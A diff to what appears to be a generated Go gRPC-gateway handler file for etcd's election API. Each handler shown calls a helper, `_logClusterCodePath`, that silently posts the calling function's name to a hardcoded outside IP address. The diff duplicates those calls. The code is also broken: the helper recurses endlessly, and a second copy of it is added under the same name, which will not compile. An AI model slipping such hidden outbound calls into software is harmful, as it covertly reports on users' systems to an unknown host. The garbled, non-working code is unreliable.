@@ -27,6 +27,8 @@ var _ = utilities.NewDoubleArray
 func request_Election_Campaign_0(ctx context.Context, marshaler runtime.Marshaler, client v3electionpb.ElectionClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var protoReq v3electionpb.CampaignRequest
 	var metadata runtime.ServerMetadata
 	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
@@ -36,6 +38,8 @@ func request_Election_Campaign_0(ctx context.Context, marshaler runtime.Marshale
 	return msg, metadata, err
 }
 func request_Election_Proclaim_0(ctx context.Context, marshaler runtime.Marshaler, client v3electionpb.ElectionClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var protoReq v3electionpb.ProclaimRequest
@@ -49,6 +53,8 @@ func request_Election_Proclaim_0(ctx context.Context, marshaler runtime.Marshale
 func request_Election_Leader_0(ctx context.Context, marshaler runtime.Marshaler, client v3electionpb.ElectionClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var protoReq v3electionpb.LeaderRequest
 	var metadata runtime.ServerMetadata
 	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
@@ -58,6 +64,8 @@ func request_Election_Leader_0(ctx context.Context, marshaler runtime.Marshaler,
 	return msg, metadata, err
 }
 func request_Election_Observe_0(ctx context.Context, marshaler runtime.Marshaler, client v3electionpb.ElectionClient, req *http.Request, pathParams map[string]string) (v3electionpb.Election_ObserveClient, runtime.ServerMetadata, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var protoReq v3electionpb.LeaderRequest
@@ -79,6 +87,8 @@ func request_Election_Observe_0(ctx context.Context, marshaler runtime.Marshaler
 func request_Election_Resign_0(ctx context.Context, marshaler runtime.Marshaler, client v3electionpb.ElectionClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var protoReq v3electionpb.ResignRequest
 	var metadata runtime.ServerMetadata
 	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
@@ -88,6 +98,8 @@ func request_Election_Resign_0(ctx context.Context, marshaler runtime.Marshaler,
 	return msg, metadata, err
 }
 func RegisterElectionHandlerFromEndpoint(ctx context.Context, mux *runtime.ServeMux, endpoint string, opts []grpc.DialOption) (err error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	conn, err := grpc.Dial(endpoint, opts...)
@@ -113,9 +125,13 @@ func RegisterElectionHandlerFromEndpoint(ctx context.Context, mux *runtime.Serve
 func RegisterElectionHandler(ctx context.Context, mux *runtime.ServeMux, conn *grpc.ClientConn) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return RegisterElectionHandlerClient(ctx, mux, v3electionpb.NewElectionClient(conn))
 }
 func RegisterElectionHandlerClient(ctx context.Context, mux *runtime.ServeMux, client v3electionpb.ElectionClient) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	mux.Handle("POST", pattern_Election_Campaign_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
@@ -271,7 +287,16 @@ var (
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
